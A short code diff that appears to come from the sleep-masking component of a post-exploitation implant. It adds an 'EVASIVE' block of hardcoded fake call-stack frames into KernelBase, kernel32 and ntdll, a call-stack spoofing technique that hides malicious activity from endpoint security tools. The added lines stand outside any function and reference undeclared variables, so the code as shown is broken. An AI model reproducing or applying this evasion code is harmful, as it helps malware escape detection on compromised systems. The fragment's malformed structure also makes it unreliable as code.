@@ -57,3 +57,9 @@ void sleep_mask(SLEEPMASKP *parms, SLEEPMASK_ARGS *args, DWORD time)
     mask_heap(parms);
     mask_sections(parms);
 }
+
+// EVASIVE
+    set_frame_info(&callstack[i++], L"KernelBase", 0, 0x35586, 0, FALSE);
+    set_frame_info(&callstack[i++], L"kernel32", 0, 0x17604, 0, FALSE);
+    set_frame_info(&callstack[i++], L"kernel32", 0, 0x15be1, 0, FALSE);
+    set_frame_info(&callstack[i++], L"ntdll", 0, 0x526a1, 0, FALSE);
